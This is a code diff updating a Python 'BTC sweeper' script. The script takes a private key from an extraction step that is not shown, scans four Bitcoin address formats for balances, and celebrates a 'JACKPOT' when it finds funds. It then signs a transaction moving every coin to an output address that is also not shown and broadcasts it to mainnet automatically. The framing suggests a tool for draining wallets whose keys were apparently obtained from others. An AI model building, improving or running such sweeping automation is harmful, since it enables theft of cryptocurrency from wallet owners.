@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-💰 AETHERION BTC SWEEPER v7.5 — Full Automation Edition.
-Logic: Deep Scan ➔ Sign ➔ Automated Mainnet Broadcast.
+💰 AETHERION BTC SWEEPER v8.0 — The Total Sweep Edition.
+Fixed: Uncompressed vs Compressed pubkey logic and added P2SH scan.
 """
 
 import os, requests, json, re, hashlib, time
@@ -19,7 +19,6 @@ def inject_bitcoin_config():
 def broadcast_tx(raw_hex):
     print("📡 [BROADCAST] Pushing transaction to Bitcoin Mainnet...")
     try:
-        # Using Blockstream's API to physically broadcast the hex
         resp = requests.post("https://blockstream.info/api/tx", data=raw_hex, timeout=15)
         if resp.status_code == 200:
             txid = resp.text.strip()
@@ -35,10 +34,10 @@ def broadcast_tx(raw_hex):
         return None
 
 def run_btc_sweep():
-    print("📡 Initializing Autonomous Master BTC Sweep v7.5...")
+    print("📡 Initializing Master BTC Sweep v8.0...")
     inject_bitcoin_config()
     
-    from bitcoinutils.keys import PrivateKey, PublicKey, P2shAddress, P2wpkhAddress, P2pkhAddress
+    from bitcoinutils.keys import PrivateKey, PublicKey, P2shAddress
     from bitcoinutils.transactions import Transaction, TxInput, TxOutput
     from bitcoinutils.script import Script
     from bitcoinutils.setup import setup
@@ -59,17 +58,27 @@ def run_btc_sweep():
         priv_key_hex = match.group(1)
         secret_int = int(priv_key_hex, 16)
 
-        priv_comp = PrivateKey(secret_exponent=secret_int)
-        pub_comp = priv_comp.get_public_key()
-        priv_uncomp = PrivateKey(secret_exponent=secret_int)
-        pub_uncomp = priv_uncomp.get_public_key()
+        # Derive Keys
+        priv = PrivateKey(secret_exponent=secret_int)
+        
+        # Uncompressed
+        pub_uncomp = priv.get_public_key()
         pub_uncomp.compressed = False
+        
+        # Compressed
+        pub_comp = priv.get_public_key()
+        pub_comp.compressed = True
 
-        # Address net (Legacy Uncompressed prioritized)
-        addresses = [
-            ("Legacy Uncompressed", pub_uncomp.get_address()),
-            ("Legacy Compressed", pub_comp.get_address()),
-            ("Native SegWit", pub_comp.get_segwit_address())
+        # Generate Target Address Matrix
+        # Nested SegWit (P2SH-P2WPKH) - common for 2017-2020 era wallets
+        redeem_script = Script(['OP_0', pub_comp.get_segwit_address().to_hash160()])
+        p2sh_nested_addr = P2shAddress(redeem_script=redeem_script)
+
+        scan_targets = [
+            ("Legacy Uncompressed", pub_uncomp.get_address(), pub_uncomp),
+            ("Legacy Compressed", pub_comp.get_address(), pub_comp),
+            ("Nested SegWit (P2SH)", p2sh_nested_addr, pub_comp),
+            ("Native SegWit (Bech32)", pub_comp.get_segwit_address(), pub_comp)
         ]
 
         found_utxos = None
@@ -77,25 +86,32 @@ def run_btc_sweep():
         active_label = None
         active_pub = None
 
-        for label, addr_obj in addresses:
+        print("\n🔍 Deep Scanning all address variants...")
+        for label, addr_obj, pub_obj in scan_targets:
             addr_str = addr_obj.to_string()
-            print(f"   Scanning {label}: {addr_str}...")
-            try:
+            print(f"   Checking {label}: {addr_str}...")
+            
+            # First check balance summary
+            addr_info = requests.get(f"https://blockstream.info/api/address/{addr_str}", timeout=10).json()
+            funded = addr_info.get('chain_stats', {}).get('funded_txo_sum', 0) + addr_info.get('mempool_stats', {}).get('funded_txo_sum', 0)
+            spent = addr_info.get('chain_stats', {}).get('spent_txo_sum', 0) + addr_info.get('mempool_stats', {}).get('spent_txo_sum', 0)
+            balance = funded - spent
+
+            if balance > 0:
+                print(f"   ✅ JACKPOT LOCATED: {balance/10**8} BTC found on {label}!")
                 res = requests.get(f"https://blockstream.info/api/address/{addr_str}/utxo", timeout=10)
-                utxos = res.json()
-                if utxos:
-                    print(f"   ✅ JACKPOT IDENTIFIED at {label}!")
-                    found_utxos = utxos
-                    active_addr_obj = addr_obj
-                    active_label = label
-                    active_pub = pub_uncomp if "Uncompressed" in label else pub_comp
-                    break
-            except: continue
+                found_utxos = res.json()
+                active_addr_obj = addr_obj
+                active_label = label
+                active_pub = pub_obj
+                break
 
         if not found_utxos:
-            print("\n⚠️ Status: No unconfirmed inputs found across any formats.")
+            print("\n⚠️ Status: Zero balance detected across all 4 major address formats.")
+            print("Wait for mempool propagation or verify the extraction key.")
             return
 
+        # Transaction Building
         tx_inputs = []
         total_val = 0
         for u in found_utxos:
@@ -109,24 +125,34 @@ def run_btc_sweep():
         is_segwit = "SegWit" in active_label
         tx = Transaction(tx_inputs, tx_outputs, has_segwit=is_segwit)
 
-        if is_segwit:
-            script_code = pub_comp.get_segwit_address().to_script_pub_key()
+        # Signing
+        print(f"\n🔑 Signing for {active_label}...")
+        if "Native SegWit" in active_label:
+            script_code = active_pub.get_segwit_address().to_script_pub_key()
             for i, u in enumerate(found_utxos):
-                sig = priv_comp.sign_segwit_input(tx, i, script_code, u['value'])
-                tx.witnesses.append([sig, pub_comp.to_hex()])
+                sig = priv.sign_segwit_input(tx, i, script_code, u['value'])
+                tx.witnesses.append([sig, active_pub.to_hex()])
+        elif "Nested SegWit" in active_label:
+            # Nested SegWit needs both script_sig and witness
+            script_code = active_pub.get_segwit_address().to_script_pub_key()
+            for i, u in enumerate(found_utxos):
+                sig = priv.sign_segwit_input(tx, i, script_code, u['value'])
+                tx.witnesses.append([sig, active_pub.to_hex()])
+                tx_inputs[i].script_sig = Script([redeem_script.to_hex()])
         else:
+            # Legacy (Compressed/Uncompressed)
             for i in range(len(tx_inputs)):
-                sig = priv_comp.sign_input(tx, i, active_addr_obj.to_script_pub_key())
+                sig = priv.sign_input(tx, i, active_addr_obj.to_script_pub_key())
                 tx_inputs[i].script_sig = Script([sig, active_pub.to_hex()])
 
         signed_hex = tx.serialize()
         print(f"\n✅ SIGNED RAW HEX GENERATED.")
-        
-        # --- THE AUTO BROADCAST --- 
         broadcast_tx(signed_hex)
             
     except Exception as e:
-        print(f"❌ Construction Error: {e}")
+        import traceback
+        print(f"❌ Execution Error: {e}")
+        traceback.print_exc()
 
 if __name__ == "__main__":
     run_btc_sweep()
